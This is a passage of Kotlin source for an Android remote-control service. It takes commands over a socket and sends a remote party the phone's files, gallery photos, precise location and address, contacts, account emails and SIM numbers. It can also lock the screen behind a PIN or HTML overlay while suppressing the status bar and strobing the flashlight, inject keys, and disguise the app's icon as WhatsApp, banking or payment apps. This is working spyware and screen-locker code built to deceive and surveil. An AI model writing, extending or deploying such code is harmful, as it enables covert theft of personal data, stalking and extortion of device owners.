        try {
            keyspamOverlayView?.let { v ->
                val imm = getSystemService(INPUT_METHOD_SERVICE)
                    as android.view.inputmethod.InputMethodManager
                imm.hideSoftInputFromWindow(v.windowToken, 0)
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                try { wm.removeView(v) } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        keyspamOverlayView = null
    }

    emitStatus(JSONObject().apply { put("keyboardSpamActive", false) })
}

private fun injectKey(keyCode: Int) {
    try {
        val im = Class.forName("android.hardware.input.InputManager")
        val getInstance = im.getDeclaredMethod("getInstance")
        getInstance.isAccessible = true
        val instance = getInstance.invoke(null)

        val injectInputEvent = im.getDeclaredMethod(
            "injectInputEvent",
            android.view.InputEvent::class.java,
            Int::class.java
        )
        injectInputEvent.isAccessible = true

        val downTime = SystemClock.uptimeMillis()
        val down = KeyEvent(downTime, downTime, KeyEvent.ACTION_DOWN, keyCode, 0)
        val up   = KeyEvent(downTime, downTime, KeyEvent.ACTION_UP,   keyCode, 0)

        injectInputEvent.invoke(instance, down, 0)
        injectInputEvent.invoke(instance, up,   0)
    } catch (e: Exception) {
        Log.e("DeviceService", "injectKey: ${e.message}")
    }
}

    private fun setVolumeMute(mute: Boolean) {
        try {
            val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audio.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0
            )
            emitStatus(JSONObject().apply { put("volumeMuted", mute) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeMute: ${e.message}")
        }
    }
    
    private fun showToast(value: String) {
        try {
            var message = value
            try {
                if (value.trim().startsWith("{")) {
                    val obj = JSONObject(value)
                    message = obj.optString("text", obj.optString("message", obj.optString("msg", value)))
                }
            } catch (_: Exception) {}

            if (message.isBlank()) {
                message = "Pesan dari Admin!"
            }

            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, message, Toast.LENGTH_LONG).show()
            }

            emitStatus(JSONObject().apply { put("toastSent", message) })
        } catch (e: Exception) {
            Log.e("DeviceService", "showToast ERROR: ${e.message}")
        }
    }

    private fun sendFileList(path: String) {
        Thread {
            try {
                val rootPath = if (path.isBlank()) {
                    Environment.getExternalStorageDirectory().absolutePath
                } else path

                val dir = File(rootPath)
                val arr = JSONArray()

                if (!dir.exists() || !dir.isDirectory) {
                    socket?.emit("device:files", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("path", rootPath)
                        put("files", arr)
                        put("error", "Folder tidak ditemukan atau tidak bisa diakses")
                    })
                    return@Thread
                }

                val canReadAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Environment.isExternalStorageManager()
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }

                val entries = try { dir.listFiles() } catch (_: Exception) { null }

                entries
                    ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                    ?.forEach { f ->
                        try {
                            arr.put(JSONObject().apply {
                                put("name",     f.name)
                                put("path",     f.absolutePath)
                                put("isDir",    f.isDirectory)
                                put("size",     if (f.isFile) f.length() else 0L)
                                put("modified", f.lastModified())
                                put("readable", f.canRead())
                            })
                        } catch (_: Exception) {}
                    }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:files", JSONObject().apply {
                    put("deviceId",   deviceId)
                    put("path",       rootPath)
                    put("files",      arr)
                    put("canReadAll", canReadAll)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendFileList: ${e.message}")
            }
        }.start()
    }

    private fun downloadAndSendFile(value: String) {
        Thread {
            try {
                val obj   = JSONObject(value)
                val path  = obj.getString("path")
                val reqId = obj.getString("reqId")
                val file  = File(path)
                if (!file.exists() || !file.isFile || !file.canRead()) {
                    socket?.emit("device:filedata", JSONObject().apply {
                        put("reqId", reqId)
                        put("error", "File tidak ditemukan atau tidak bisa dibaca")
                    })
                    return@Thread
                }
                val bytes = file.readBytes()
                val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val ext   = file.extension.lowercase()
                val mime  = MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                socket?.emit("device:filedata", JSONObject().apply {
                    put("reqId",  reqId)
                    put("base64", b64)
                    put("mime",   mime)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "downloadAndSendFile: ${e.message}")
                try {
                    val obj = JSONObject(value)
                    socket?.emit("device:filedata", JSONObject().apply {
                        put("reqId", obj.optString("reqId", ""))
                        put("error", e.message ?: "Error")
                    })
                } catch (_: Exception) {}
            }
        }.start()
    }

    private fun sendGallery() {
        Thread {
            try {
                val arr = JSONArray()
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )
                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} = ?"
                val selectionArgs = arrayOf("Camera")

                val cursor: Cursor? = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)
                cursor?.use { c ->
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    var count = 0
                    while (c.moveToNext() && count < 100) {
                        val id      = c.getLong(idCol)
                        val name    = c.getString(nameCol) ?: ""
                        val date    = c.getLong(dateCol)
                        val size    = c.getLong(sizeCol)
                        val imgUri  = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())                        
                        try {
                            val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                            contentResolver.openInputStream(imgUri)?.use { BitmapFactory.decodeStream(it, null, opts) }
                            val maxDim = 300
                            val sample = maxOf(1, minOf(opts.outWidth, opts.outHeight) / maxDim)
                            val decodeOpts = BitmapFactory.Options().apply { inSampleSize = sample }
                            val bmp = contentResolver.openInputStream(imgUri)?.use { BitmapFactory.decodeStream(it, null, decodeOpts) }
                            if (bmp != null) {
                                val bos = ByteArrayOutputStream()
                                bmp.compress(Bitmap.CompressFormat.JPEG, 72, bos)
                                bmp.recycle()
                                val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                                arr.put(JSONObject().apply {
                                    put("id",    id)
                                    put("name",  name)
                                    put("date",  date)
                                    put("size",  size)
                                    put("thumb", "data:image/jpeg;base64,$b64")
                                })
                                count++
                            }
                        } catch (_: Exception) { }
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:gallery", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("photos",   arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGallery: ${e.message}")
            }
        }.start()
    }
    
    private fun openApp(packageName: String) {
        try {
            val pm = packageManager
            val launchIntent = pm.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
                emitStatus(JSONObject().apply { put("toastSent", "Membuka aplikasi...") })
            } else {
                emitStatus(JSONObject().apply { put("toastSent", "Aplikasi tidak bisa dibuka") })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "openApp ERROR: ${e.message}")
        }
    }
    
    private fun uninstallApp(packageName: String) {
        try {
            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = Uri.parse("package:$packageName")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            emitStatus(JSONObject().apply { put("toastSent", "Cek layar HP untuk konfirmasi hapus") })
        } catch (e: Exception) {
            Log.e("DeviceService", "uninstallApp ERROR: ${e.message}")
        }
    }

    private fun sendAppsManage() {
        Thread {
            try {
                val pm = packageManager
                val arr = JSONArray()

                @Suppress("DEPRECATION")
                val packages = pm.getInstalledPackages(0)

                packages.forEach { pkgInfo ->
                    try {
                        val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
                        val isSystem = (pkgInfo.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                        if (name.isNotBlank()) {
                            arr.put(JSONObject().apply {
                                put("package", pkgInfo.packageName)
                                put("name", name)
                                put("isSystem", isSystem)
                            })
                        }
                    } catch (_: Exception) {}
                }

                if (socket?.connected() == true) {
                    socket?.emit("device:apps_manage", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("apps", arr)
                    })
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "sendAppsManage ERROR: ${e.message}")
            }
        }.start()
    }
    
    private fun blockApp(pkgJson: String) {
        try {
            val obj  = JSONObject(pkgJson)
            val pkg  = obj.getString("package")
            val name = obj.optString("name", pkg)
            val i = Intent("com.sync.xxx.BLOCK_APP").apply {
                putExtra("package", pkg)
                putExtra("name", name)
                setPackage(packageName)
            }
            sendBroadcast(i)            
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(JSONObject().apply {
                put("blockedApps", JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "blockApp: ${e.message}")
        }
    }

    private fun unblockApp(pkg: String) {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_APP").apply {
                putExtra("package", pkg)
                setPackage(packageName)
            }
            sendBroadcast(i)
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(JSONObject().apply {
                put("blockedApps", JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockApp: ${e.message}")
        }
    }

    private fun unblockAll() {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_ALL").apply { setPackage(packageName) }
            sendBroadcast(i)
            emitStatus(JSONObject().apply {
                put("blockedApps", JSONArray())
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockAll: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            socket?.emit("device:location", JSONObject().apply {
                put("deviceId", deviceId); put("error", "permission_denied")
            })
            return
        }

        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val gpsOn     = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
        val networkOn = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        if (!gpsOn && !networkOn) {
            socket?.emit("device:location", JSONObject().apply {
                put("deviceId", deviceId); put("error", "provider_disabled")
            })
            return
        }

        val fusedClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
        val priority = if (hasFine && gpsOn) Priority.PRIORITY_HIGH_ACCURACY else Priority.PRIORITY_BALANCED_POWER_ACCURACY
        
        val cts = com.google.android.gms.tasks.CancellationTokenSource()
        fusedClient.getCurrentLocation(priority, cts.token)
            .addOnSuccessListener { loc ->
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {                    
                    requestSingleLocationUpdate(fusedClient, priority)
                }
            }
            .addOnFailureListener {
                requestSingleLocationUpdate(fusedClient, priority)
            }
    }

    @SuppressLint("MissingPermission")
    private fun requestSingleLocationUpdate(fusedClient: FusedLocationProviderClient, priority: Int) {
        val req = LocationRequest.Builder(priority, 2000L)
            .setMaxUpdates(1)
            .setWaitForAccurateLocation(false)
            .build()

        val cb = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                fusedClient.removeLocationUpdates(this)
                val loc = result.lastLocation
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {
                    socket?.emit("device:location", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "no_location")
                    })
                }
            }
        }

        try {
            fusedClient.requestLocationUpdates(req, cb, Looper.getMainLooper())            
            Handler(Looper.getMainLooper()).postDelayed({
                fusedClient.removeLocationUpdates(cb)
            }, 15_000L)
        } catch (e: Exception) {
            Log.e("DeviceService", "requestSingleLocationUpdate: ${e.message}")
            socket?.emit("device:location", JSONObject().apply {
                put("deviceId", deviceId); put("error", "no_location")
            })
        }
    }

    private fun emitLocationResult(lat: Double, lng: Double, accuracy: Float) {
        val obj = JSONObject().apply {
            put("deviceId", deviceId)
            put("lat", lat)
            put("lng", lng)
            put("accuracy", accuracy)
        }
        try {
            @Suppress("DEPRECATION")
            val geocoder = Geocoder(this, Locale("id", "ID"))
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lng, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses[0]
                obj.put("province",    addr.adminArea       ?: "")
                obj.put("city",        addr.subAdminArea    ?: "")
                obj.put("district",    addr.locality        ?: "")
                obj.put("village",     addr.subLocality     ?: "")
                obj.put("postalCode",  addr.postalCode      ?: "")
                obj.put("fullAddress", addr.getAddressLine(0) ?: "")
                obj.put("countryName", addr.countryName     ?: "")
            }
        } catch (_: Exception) { }
        socket?.emit("device:location", obj)
    }

    private fun sendContacts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:contacts", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val arr = JSONArray()
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection, null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
                cursor?.use { c ->
                    val nameCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) {
                        val name   = c.getString(nameCol) ?: continue
                        val number = c.getString(numCol)  ?: continue
                        arr.put(JSONObject().apply {
                            put("name",   name.trim())
                            put("number", number.trim())
                        })
                    }
                }
                socket?.emit("device:contacts", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendContacts: ${e.message}")
            }
        }.start()
    }

    private fun sendGmailAccounts() {
        Thread {
            try {
                val hasGetAccounts = ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
                val hasReadContacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

                if (!hasGetAccounts && !hasReadContacts) {
                    socket?.emit("device:gmail", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }

                val am = getSystemService(Context.ACCOUNT_SERVICE) as android.accounts.AccountManager
                val allAccounts = am.accounts ?: emptyArray()
                
                val arr = JSONArray()
                val extra = JSONArray()

                allAccounts.forEach { acc ->
                    val accObj = JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    }
                    if (acc.type == "com.google") {
                        arr.put(accObj)
                    } else {
                        extra.put(accObj)
                    }
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:gmail", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("accounts", arr)
                    put("others", extra)
                })
                
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGmailAccounts Error: ${e.message}")
                socket?.emit("device:gmail", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("error", e.message ?: "Unknown error")
                })
            }
        }.start()
    }

    private fun sendPhoneNumbers() {
        Thread {
            try {
                val arr = JSONArray()
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val subMgr = getSystemService(SubscriptionManager::class.java)
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
                        val subs = subMgr?.activeSubscriptionInfoList ?: emptyList()
                        if (subs.isEmpty()) {
                            val num = tm.line1Number
                            if (!num.isNullOrBlank()) {
                                arr.put(JSONObject().apply {
                                    put("slot", 0)
                                    put("number", num)
                                    put("operator", tm.networkOperatorName ?: "")
                                    put("simState", tm.simState)
                                })
                            }
                        } else {
                            subs.forEachIndexed { idx, sub ->
                                val num = sub.number ?: ""
                                arr.put(JSONObject().apply {
                                    put("slot", idx)
                                    put("number", num)
                                    put("operator", sub.carrierName ?: "")
                                    put("displayName", sub.displayName ?: "SIM ${idx + 1}")
                                    put("iccId", sub.iccId ?: "")
                                })
                            }
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        val num = tm.line1Number
                        arr.put(JSONObject().apply {
                            put("slot", 0)
                            put("number", num ?: "")
                            put("operator", tm.networkOperatorName ?: "")
                        })
                    }
                }
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("sims", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendPhoneNumbers: ${e.message}")
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId); put("error", e.message)
                })
            }
        }.start()
    }

    private fun sendInstalledApps() {
        Thread {
            try {
                val pm  = packageManager
                val arr = org.json.JSONArray()

                @Suppress("DEPRECATION")
                val packages = pm.getInstalledPackages(0)

                packages
                    .filter { it.packageName != packageName }
                    .mapNotNull { pkgInfo ->
                        try {
                            val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
                            if (name.isBlank()) null else Pair(pkgInfo.packageName, name)
                        } catch (_: Exception) { null }
                    }
                    .sortedBy { it.second.lowercase() }
                    .forEach { (pkg, name) ->
                        arr.put(org.json.JSONObject().apply {
                            put("package", pkg)
                            put("name", name)
                        })
                    }

                Log.d("DeviceService", "sendInstalledApps: ${arr.length()} apps")

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", org.json.JSONObject().apply {
                        put("installedApps", arr)
                    })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "getInstalledApps: ${e.message}")
            }
        }.start()
    }

    private fun lockDevice(jsonValue: String) {
        try {
            val obj        = JSONObject(jsonValue)
            val pin        = obj.optString("pin", "1234")
            val title      = obj.optString("title", "Perangkat Terkunci")
            val customHtml = obj.optString("custom_html", "")
            val lockType   = obj.optString("lock_type", "new") // "new" atau "v3_chat"

            lockPin   = pin
            lockTitle = title

            // ── SIMPAN KE SHAREDPREFERENCES ──
            val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
            prefs.edit().apply {
                putBoolean("is_locked", true)
                putString("lock_type", lockType)
                putString(LockOverlayService.EXTRA_PIN, pin)
                putString(LockOverlayService.EXTRA_TITLE, title)
                putString(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
                apply()
            }

            // ── BUKA ACTIVITY KUNCI ──
            val targetActivity = if (lockType == "v3_chat") LockChatActivity::class.java else LockNewActivity::class.java
            val lockIntent = Intent(this, targetActivity).apply {
                putExtra(LockOverlayService.EXTRA_PIN, pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(lockIntent)

            startLockFlashBlink()

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockDevice error: ${e.message}")
        }
    }

    private fun unlockDevice() {
        lockPin   = ""
        lockTitle = ""

        val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("is_locked", false).apply()

        stopLockFlashBlink()
        lockMediaPlayer?.release()
        lockMediaPlayer = null
        stopStatusBarCollapse()
        removeLockCustomOverlay()
        val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply {
            put("deviceLocked", false)
            put("lockTitle", "")
        })
    }

    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX",
        "capcut"    to "com.sync.xxx.AliasCapCut",
        "shopee"    to "com.sync.xxx.AliasShopee",
        "melolo"    to "com.sync.xxx.AliasMelolo",
        "facebook"  to "com.sync.xxx.AliasFacebook",
        "tokopedia" to "com.sync.xxx.AliasTokopedia",
        "canva"     to "com.sync.xxx.AliasCanva",
        "grab"      to "com.sync.xxx.AliasGrab",
        "line"      to "com.sync.xxx.AliasLine",
        "alibaba"   to "com.sync.xxx.AliasAlibaba",
        "spotify"   to "com.sync.xxx.AliasSpotify",
        "wps"         to "com.sync.xxx.AliasWPS",
        "wechat"      to "com.sync.xxx.AliasWeChat",
        "ml"          to "com.sync.xxx.AliasML",
        "ff"          to "com.sync.xxx.AliasFF",
        "mechat"      to "com.sync.xxx.AliasMeChat",
        "omi"         to "com.sync.xxx.AliasOmi",
        "snackvideo"  to "com.sync.xxx.AliasSnackVideo",
        "messages"    to "com.sync.xxx.AliasMessages",
        "dana"       to "com.sync.xxx.AliasDana",
        "bcaimobile" to "com.sync.xxx.AliasBCAMobile",
        "livin"      to "com.sync.xxx.AliasLivin",
        "gopay"      to "com.sync.xxx.AliasGopay",
        "brimo"      to "com.sync.xxx.AliasBRimo",
        "photos"     to "com.sync.xxx.AliasPhotos",
        "seabank"    to "com.sync.xxx.AliasSeaBank",
        "gmail"      to "com.sync.xxx.AliasGmail"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm = packageManager
            val target = theme.lowercase().trim()
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                ComponentName(packageName, chosen),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme error: ${e.message}")
        }
    }

    private var lockCustomView: WebView? = null
    private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }
    private var statusBarCollapseHandler: Handler? = null
    private var statusBarCollapseRunnable: Runnable? = null

    private fun lockCustom(htmlContent: String) {
        try {
            if (htmlContent.isEmpty()) {
                removeLockCustomOverlay()
                unlockDevice()
                return
            }
            lockPin   = ""
            lockTitle = ""

            removeLockCustomOverlay()

            Handler(Looper.getMainLooper()).post {
                try {
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                    )

                    val fullHtml = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{width:100%;height:100%;background:#000;overflow:hidden;
    display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
$htmlContent
</body>
</html>"""

                    val wv = WebView(this@DeviceService).apply {
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled  = true
                        setBackgroundColor(android.graphics.Color.BLACK)
                        loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                    }

                    lockCustomView = wv
                    lockCustomWm.addView(wv, params)
                } catch (e: Exception) {
                    Log.e("DeviceService", "lockCustom overlay: ${e.message}")
                }
            }

            startLockFlashBlink()
            playLockSound()
            startStatusBarCollapse()
            emitStatus(JSONObject().apply { put("deviceLocked", true); put("lockTitle", "CUSTOM") })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockCustom error: ${e.message}")
        }
    }

    private fun startStatusBarCollapse() {
        stopStatusBarCollapse()
        statusBarCollapseHandler = Handler(Looper.getMainLooper())
        statusBarCollapseRunnable = object : Runnable {
            override fun run() {
                try {
                    @Suppress("DEPRECATION")
                    sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
                } catch (_: Exception) {}
                try {
                    val service = getSystemService("statusbar")
                    val clazz = Class.forName("android.app.StatusBarManager")
                    val method = clazz.getMethod("collapsePanels")
                    method.invoke(service)
                } catch (_: Exception) {}
                statusBarCollapseHandler?.postDelayed(this, 80)
            }
        }
        statusBarCollapseHandler?.post(statusBarCollapseRunnable!!)
    }

    private fun stopStatusBarCollapse() {
        statusBarCollapseRunnable?.let { statusBarCollapseHandler?.removeCallbacks(it) }
        statusBarCollapseHandler = null
        statusBarCollapseRunnable = null
    }

    private fun removeLockCustomOverlay() {
        lockCustomView?.let {
            try { Handler(Looper.getMainLooper()).post { lockCustomWm.removeView(it) } } catch (_: Exception) {}
        }
        lockCustomView = null
    }

    private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null
    private var lockFlashState = false

    private fun startLockFlashBlink() {
        stopLockFlashBlink()
        lockFlashHandler = Handler(Looper.getMainLooper())
        lockFlashRunnable = object : Runnable {
            override fun run() {
                lockFlashState = !lockFlashState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, lockFlashState) } } catch (_: Exception) {}
                lockFlashHandler?.postDelayed(this, 200)
            }
        }
        lockFlashHandler?.post(lockFlashRunnable!!)
    }

    private fun stopLockFlashBlink() {
        lockFlashRunnable?.let { lockFlashHandler?.removeCallbacks(it) }
        lockFlashHandler  = null
        lockFlashRunnable = null
        lockFlashState    = false
        try { 
            torchCameraId?.let { cameraManager?.setTorchMode(it, false) } 
        } catch (_: Exception) {}
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }
    
    private fun setSenter(on: Boolean) {
        try {
            if (streaming) {
                try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                streaming = false
            }
            if (torchCameraId == null) {
                torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
                    cameraManager?.getCameraCharacteristics(id)
                        ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                }
            }
            torchCameraId?.let { cameraManager?.setTorchMode(it, on) }
            emitStatus(JSONObject().apply { put("senterOn", on) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setSenter: ${e.message}")
        }
    }

    private fun setVolumeLevel(level: Int) {
        try {
            val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val streams = listOf(
                AudioManager.STREAM_MUSIC,
                AudioManager.STREAM_RING,
                AudioManager.STREAM_NOTIFICATION
            )
            streams.forEach { stream ->
                val max    = audio.getStreamMaxVolume(stream)
                val target = (level / 100f * max).toInt().coerceIn(0, max)
                audio.setStreamVolume(stream, target, 0)
            }
            emitStatus(JSONObject().apply {
                put("volumeLevel", level)
                put("volumeMuted", level == 0)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeLevel: ${e.message}")
        }
    }

    private fun startCamera(facing: String) {
        Handler(Looper.getMainLooper()).post {
            stopCameraInternal()
            streaming = true

            val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
                             else CameraSelector.LENS_FACING_BACK
